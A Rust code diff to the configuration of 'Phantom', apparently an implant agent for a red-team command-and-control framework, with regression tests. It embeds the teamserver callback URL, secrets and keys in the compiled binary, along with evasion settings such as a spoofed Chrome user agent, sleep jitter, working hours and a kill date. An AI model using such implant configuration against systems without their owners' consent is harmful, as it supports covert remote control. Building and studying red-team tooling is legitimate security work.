@@ -236,21 +236,47 @@ impl PhantomConfig {
 impl Default for PhantomConfig {
     fn default() -> Self {
         Self {
-            callback_url: String::from("https://127.0.0.1:40056/"),
-            init_secret: None,
-            init_secret_version: None,
-            pinned_cert_pem: None,
-            user_agent: String::from(
-                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
+            // Bake in the teamserver callback URL when built with
+            // PHANTOM_CALLBACK_URL set.  Falls back to a loopback default
+            // that is only useful for local testing.
+            callback_url: option_env!("PHANTOM_CALLBACK_URL")
+                .map(str::to_string)
+                .unwrap_or_else(|| String::from("https://127.0.0.1:40056/")),
+            init_secret: option_env!("PHANTOM_INIT_SECRET").map(str::to_string),
+            init_secret_version: parse_compile_env::<u8>("PHANTOM_INIT_SECRET_VERSION"),
+            pinned_cert_pem: option_env!("PHANTOM_PINNED_CERT_PEM").map(str::to_string),
+            user_agent: option_env!("PHANTOM_USER_AGENT").map(str::to_string).unwrap_or_else(
+                || {
+                    String::from(
+                        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
+                    )
+                },
             ),
-            sleep_delay_ms: 5_000,
-            sleep_jitter: 20,
-            kill_date: None,
-            working_hours: None,
+            sleep_delay_ms: parse_compile_env::<u32>("PHANTOM_SLEEP_DELAY_MS").unwrap_or(5_000),
+            sleep_jitter: parse_compile_env::<u32>("PHANTOM_SLEEP_JITTER").unwrap_or(20),
+            kill_date: parse_compile_env::<i64>("PHANTOM_KILL_DATE"),
+            working_hours: parse_compile_env::<i32>("PHANTOM_WORKING_HOURS"),
             sleep_mode: SleepMode::default(),
-            listener_pub_key: None,
+            listener_pub_key: option_env!("PHANTOM_LISTENER_PUB_KEY").map(str::to_string),
         }
     }
+}
+
+/// Parse a compile-time environment variable into a value of type `T`.
+///
+/// Returns `None` when the variable is unset or empty, or when the value
+/// cannot be parsed — falling back to the hard-coded default lets a Rust
+/// agent still build if the teamserver bakes in a malformed value.
+fn parse_compile_env<T: std::str::FromStr>(key: &str) -> Option<T> {
+    let raw = match key {
+        "PHANTOM_INIT_SECRET_VERSION" => option_env!("PHANTOM_INIT_SECRET_VERSION"),
+        "PHANTOM_SLEEP_DELAY_MS" => option_env!("PHANTOM_SLEEP_DELAY_MS"),
+        "PHANTOM_SLEEP_JITTER" => option_env!("PHANTOM_SLEEP_JITTER"),
+        "PHANTOM_KILL_DATE" => option_env!("PHANTOM_KILL_DATE"),
+        "PHANTOM_WORKING_HOURS" => option_env!("PHANTOM_WORKING_HOURS"),
+        _ => None,
+    };
+    raw.and_then(|value| if value.is_empty() { None } else { value.parse::<T>().ok() })
 }
 
 fn parse_os_string(value: OsString, key: &str) -> Result<String, PhantomError> {
@@ -296,6 +322,39 @@ mod tests {
     fn default_user_agent_is_current_chrome() {
         let config = PhantomConfig::default();
         assert!(config.user_agent.contains("Chrome/136.0.0.0"), "UA was: {}", config.user_agent);
+    }
+
+    /// Regression for red-cell-c2-g5445: the teamserver bakes callback URL
+    /// and related listener fields via `cargo build`-time env vars.  The
+    /// `default()` implementation must read them via `option_env!` so the
+    /// values end up embedded in the compiled binary, rather than being
+    /// looked up via `std::env::var` only at agent runtime (when the target
+    /// host's environment does not contain them).
+    #[test]
+    fn default_honors_compile_time_callback_url_env() {
+        let config = PhantomConfig::default();
+        let expected = option_env!("PHANTOM_CALLBACK_URL").unwrap_or("https://127.0.0.1:40056/");
+        assert_eq!(config.callback_url, expected);
+    }
+
+    #[test]
+    fn default_honors_compile_time_user_agent_env() {
+        let config = PhantomConfig::default();
+        if let Some(expected) = option_env!("PHANTOM_USER_AGENT") {
+            assert_eq!(config.user_agent, expected);
+        }
+    }
+
+    #[test]
+    fn default_honors_compile_time_init_secret_env() {
+        let config = PhantomConfig::default();
+        assert_eq!(config.init_secret.as_deref(), option_env!("PHANTOM_INIT_SECRET"),);
+    }
+
+    #[test]
+    fn default_honors_compile_time_listener_pub_key_env() {
+        let config = PhantomConfig::default();
+        assert_eq!(config.listener_pub_key.as_deref(), option_env!("PHANTOM_LISTENER_PUB_KEY"),);
     }
 
     #[test]
